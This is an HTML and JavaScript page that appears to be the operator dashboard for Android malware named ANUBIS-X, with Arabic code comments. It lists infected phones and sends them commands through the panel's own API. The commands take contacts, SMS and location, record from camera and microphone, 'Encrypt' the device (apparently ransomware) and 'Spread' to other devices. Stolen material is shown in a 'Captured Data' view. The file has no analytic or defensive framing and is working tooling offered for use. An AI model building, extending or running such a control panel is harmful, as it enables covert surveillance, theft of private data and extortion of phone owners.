<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ANUBIS-X Dashboard</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #0a0a0a;
            font-family: 'Courier New', monospace;
            color: #00ff00;
        }
        
        .header {
            background: #1a1a1a;
            padding: 20px;
            text-align: center;
            border-bottom: 2px solid #00ff00;
        }
        
        .header h1 {
            font-size: 28px;
            text-shadow: 0 0 10px #00ff00;
        }
        
        .container {
            display: flex;
            height: calc(100vh - 80px);
        }
        
        .sidebar {
            width: 200px;
            background: #1a1a1a;
            padding: 20px;
            border-right: 2px solid #00ff00;
            display: flex;
            flex-direction: column;
            gap: 5px;
        }
        
        .sidebar button {
            width: 100%;
            padding: 12px;
            background: transparent;
            border: 1px solid #00ff00;
            color: #00ff00;
            cursor: pointer;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            transition: all 0.3s;
        }
        
        .sidebar button:hover {
            background: #00ff00;
            color: #000;
        }
        
        .main-content {
            flex: 1;
            padding: 20px;
            overflow-y: auto;
        }
        
        .device-card {
            background: #1a1a1a;
            border: 1px solid #00ff00;
            border-radius: 8px;
            padding: 15px;
            margin: 10px 0;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .device-card:hover {
            background: #2a2a2a;
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.3);
        }
        
        .device-card h3 {
            font-size: 16px;
            margin-bottom: 8px;
        }
        
        .device-card p {
            font-size: 12px;
            color: #00cc00;
            margin: 3px 0;
        }
        
        .command-panel {
            background: #1a1a1a;
            border: 1px solid #00ff00;
            border-radius: 8px;
            padding: 20px;
            margin-top: 20px;
        }
        
        .command-panel h2 {
            font-size: 18px;
            margin-bottom: 15px;
            text-align: center;
        }
        
        .command-buttons {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin-top: 15px;
        }
        
        .command-btn {
            padding: 12px;
            background: transparent;
            border: 1px solid #00ff00;
            color: #00ff00;
            cursor: pointer;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            transition: all 0.3s;
            text-align: center;
        }
        
        .command-btn:hover {
            background: #00ff00;
            color: #000;
            box-shadow: 0 0 10px #00ff00;
        }
        
        .log-output {
            background: #000;
            border: 1px solid #00ff00;
            padding: 15px;
            height: 300px;
            overflow-y: auto;
            margin-top: 20px;
            font-size: 12px;
            border-radius: 5px;
        }
        
        .log-output p {
            margin: 5px 0;
            line-height: 1.5;
        }
        
        .no-devices {
            text-align: center;
            padding: 40px;
            font-size: 18px;
            color: #ffff00;
        }
        
        .back-btn {
            margin-top: 10px;
            padding: 10px;
            background: transparent;
            border: 1px solid #ffff00;
            color: #ffff00;
            cursor: pointer;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
        }
        
        .back-btn:hover {
            background: #ffff00;
            color: #000;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>⚡ ANUBIS-X COMMAND CENTER ⚡</h1>
    </div>
    
    <div class="container">
        <div class="sidebar">
            <button onclick="showDevices()">📱 Devices</button>
            <button onclick="showLogs()">📊 Logs</button>
            <button onclick="logout()">🚪 Logout</button>
        </div>
        
        <div class="main-content" id="mainContent">
            <p>> Loading...</p>
        </div>
    </div>
    
    <script>
        let autoRefreshInterval = null;
        
        // ===== عند تحميل الصفحة =====
        window.onload = function() {
            checkAuth();
        };
        
        function checkAuth() {
            fetch('/api/check-auth')
                .then(r => r.json())
                .then(data => {
                    if (!data.logged_in) {
                        window.location.href = '/';
                    } else {
                        showDevices();
                        startAutoRefresh();
                    }
                })
                .catch(() => {
                    window.location.href = '/';
                });
        }
        
        function startAutoRefresh() {
            stopAutoRefresh();
            autoRefreshInterval = setInterval(() => {
                const content = document.getElementById('mainContent');
                if (content && content.innerHTML.includes('Connected Devices')) {
                    showDevices();
                }
            }, 5000);
        }
        
        function stopAutoRefresh() {
            if (autoRefreshInterval) {
                clearInterval(autoRefreshInterval);
                autoRefreshInterval = null;
            }
        }
        
        // ===== عرض الأجهزة =====
        function showDevices() {
            fetch('/api/devices')
                .then(r => r.json())
                .then(data => {
                    let html = '<h2>📱 Connected Devices</h2>';
                    
                    if (data.devices && data.devices.length > 0) {
                        data.devices.forEach(device => {
                            const lastSeen = new Date(device.last_seen).toLocaleString();
                            html += `
                                <div class="device-card" onclick="showCommands('${device.id}')">
                                    <h3>🟢 ${device.model || 'Unknown Device'}</h3>
                                    <p>ID: ${device.id}</p>
                                    <p>Android: ${device.android_version || 'N/A'}</p>
                                    <p>Last Seen: ${lastSeen}</p>
                                </div>
                            `;
                        });
                    } else {
                        html += '<div class="no-devices">⚠️ No devices connected<br><br>Waiting for device...</div>';
                    }
                    
                    document.getElementById('mainContent').innerHTML = html;
                })
                .catch(error => {
                    document.getElementById('mainContent').innerHTML = 
                        '<div class="no-devices">❌ Failed to load devices</div>';
                });
        }
        
        // ===== عرض الأوامر =====
        function showCommands(deviceId) {
            stopAutoRefresh();
            
            let html = `
                <div class="command-panel">
                    <h2>🎮 Command Panel</h2>
                    <p style="text-align:center; margin-bottom:10px;">Device: ${deviceId}</p>
                    
                    <div class="command-buttons">
                        <button class="command-btn" onclick="sendCommand('${deviceId}', 'contacts')">📞 Contacts</button>
                        <button class="command-btn" onclick="sendCommand('${deviceId}', 'sms')">💬 SMS</button>
                        <button class="command-btn" onclick="sendCommand('${deviceId}', 'location')">📍 Location</button>
                        <button class="command-btn" onclick="sendCommand('${deviceId}', 'camera')">📷 Camera</button>
                        <button class="command-btn" onclick="sendCommand('${deviceId}', 'audio')">🎤 Audio</button>
                        <button class="command-btn" onclick="sendCommand('${deviceId}', 'encrypt')">🔒 Encrypt</button>
                        <button class="command-btn" onclick="sendCommand('${deviceId}', 'spread')">📡 Spread</button>
                    </div>
                </div>
                
                <div class="log-output" id="logOutput">
                    <p>> Waiting for command execution...</p>
                </div>
                
                <button class="back-btn" onclick="backToDevices()">⬅ Back to Devices</button>
            `;
            
            document.getElementById('mainContent').innerHTML = html;
        }
        
        // ===== إرسال أمر =====
        function sendCommand(deviceId, command) {
            const logOutput = document.getElementById('logOutput');
            
            if (logOutput) {
                logOutput.innerHTML += `<p>> Sending: ${command}...</p>`;
            }
            
            fetch('/api/commands', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    device_id: deviceId,
                    command: command
                })
            })
            .then(r => r.json())
            .then(data => {
                if (data.success) {
                    if (logOutput) {
                        logOutput.innerHTML += `<p style="color:#00ff00;">> Command sent: ${command}</p>`;
                    }
                } else {
                    if (logOutput) {
                        logOutput.innerHTML += `<p style="color:#ff0000;">> Failed to send</p>`;
                    }
                }
            })
            .catch(error => {
                if (logOutput) {
                    logOutput.innerHTML += `<p style="color:#ff0000;">> Error: ${error.message}</p>`;
                }
            });
        }
        
        // ===== الرجوع للأجهزة =====
        function backToDevices() {
            showDevices();
            startAutoRefresh();
        }
        
        // ===== عرض السجلات =====
        function showLogs() {
            stopAutoRefresh();
            
            fetch('/api/data')
                .then(r => r.json())
                .then(data => {
                    let html = '<h2>📊 Captured Data</h2>';
                    
                    if (data.logs && data.logs.length > 0) {
                        html += '<div class="log-output" style="height: 500px;">';
                        data.logs.forEach(log => {
                            html += `<p>${log}</p>`;
                        });
                        html += '</div>';
                    } else {
                        html += '<div class="no-devices">No data captured yet</div>';
                    }
                    
                    html += '<br><button class="back-btn" onclick="backToDevices()">⬅ Back to Devices</button>';
                    
                    document.getElementById('mainContent').innerHTML = html;
                })
                .catch(error => {
                    document.getElementById('mainContent').innerHTML = 
                        '<div class="no-devices">❌ Failed to load data</div>';
                });
        }
        
        // ===== تسجيل الخروج =====
        function logout() {
            stopAutoRefresh();
            
            fetch('/api/logout', { method: 'POST' })
                .then(() => {
                    window.location.href = '/';
                })
                .catch(() => {
                    window.location.href = '/';
                });
        }
    </script>
</body>
</html>
